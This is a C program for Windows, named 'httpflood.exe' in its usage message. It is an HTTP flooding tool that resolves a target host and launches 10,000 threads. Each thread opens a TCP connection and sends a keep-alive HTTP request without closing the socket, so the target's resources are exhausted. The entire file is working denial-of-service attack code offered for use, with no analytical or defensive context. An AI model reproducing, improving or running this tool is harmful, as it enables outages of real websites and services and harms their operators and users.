#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <pthread.h>

typedef struct
{
    char *host;
    int port;
    char *method;
    char *path;
} Params;

void *request(void *arg)
{

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    Params *params = (Params *)arg;
    struct sockaddr_in address;
    address.sin_addr.s_addr = inet_addr(params->host);
    address.sin_family = AF_INET;
    address.sin_port = htons(params->port);

    int client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client == INVALID_SOCKET)
    {
        printf("Socket error nº %d\n", WSAGetLastError());
    }
    char header[1000];

    sprintf(header,
            "%s %s HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Connection: keep-alive\r\n"
            "Content-type: text/html\r\n\r\n",
            params->method, params->path);

    if (connect(client, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        printf("Failed to connect socket %d\n", WSAGetLastError());
    }

    char rec_buff[4096];
    if (send(client, header, strlen(header), 0) == SOCKET_ERROR)
    {
        printf("Error to send package %d\n", WSAGetLastError());
    }
    /*data receiving*/
    /*
    if (recv(client, rec_buff, sizeof(rec_buff) - 1, 0) < 0)
    {
        printf("Receive error %d", WSAGetLastError());
    }
    else
    {
        puts(rec_buff);
    }
    closesocket(client); */
    WSACleanup(); 
}

char *getIp(char *hostname)
{
    struct hostent *remoteHost;
    remoteHost = gethostbyname(hostname);
    struct in_addr addr;
    if (remoteHost)
    {
        addr.s_addr = *(u_long *)remoteHost->h_addr_list[0];
    }
    return inet_ntoa(addr);
}

int main(int argc, char *argv[])
{
    if (argc < 5)
    {
        puts("Usage: httpflood.exe <host> <path> <method> <port>");
        return 0;
    }
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    Params params;
    params.host = getIp(argv[1]);
    params.path = argv[2];
    params.method = argv[3];
    params.port = atoi(argv[4]);

    
    int threads_n = 10000;
    pthread_t thread_id[threads_n];

    int i;
    for (i = 0; i < threads_n; i++)
    {
        pthread_create(&thread_id[i], NULL, request, (void *) &params);
    }
    for (i = 0; i < threads_n; i++)
    {
        pthread_join(thread_id[i], NULL);
    }

    return 0;
}